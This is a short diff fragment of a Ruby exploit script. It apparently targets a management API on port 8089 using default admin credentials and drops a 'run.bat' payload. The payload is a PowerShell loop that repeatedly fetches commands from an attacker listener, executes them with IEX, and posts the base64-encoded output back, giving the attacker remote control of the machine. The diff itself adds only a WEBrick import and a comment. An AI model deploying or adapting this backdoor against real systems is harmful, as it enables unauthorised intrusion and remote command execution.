@@ -2,6 +2,7 @@ require 'tmpdir'
 require 'net/http'
 require 'securerandom'
 require 'base64'
+require 'webrick'
 
 #Lets hard code our location variables
 $lhost = '127.0.0.1'
@@ -10,6 +11,8 @@ $lport = '8181'
 $api_base = 'https://127.0.0.1:8089/'
 $username = 'admin'
 $password = 'changeme'
+
+#Probably dont need to change.
 $payload_file = "run.bat"
 $payload = %Q*powershell.exe -Command "while ($true) { Start-Sleep -Seconds 5; try { $resp = Invoke-WebRequest -Uri http://#{$lhost}:#{$lport}/command -UseBasicParsing -ErrorAction Stop; Write-Host $resp; if ($resp.StatusCode -eq 200) { $cmd = [System.Text.Encoding]::UTF8.GetString($resp.Content); $exec = IEX $cmd; $out = $exec | Out-String; Invoke-WebRequest -Uri http://127.0.0.1:8181/output -Method POST -Body ([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))) -UseBasicParsing; } } catch { Write-Host \"Error: $_\" } }"*
 
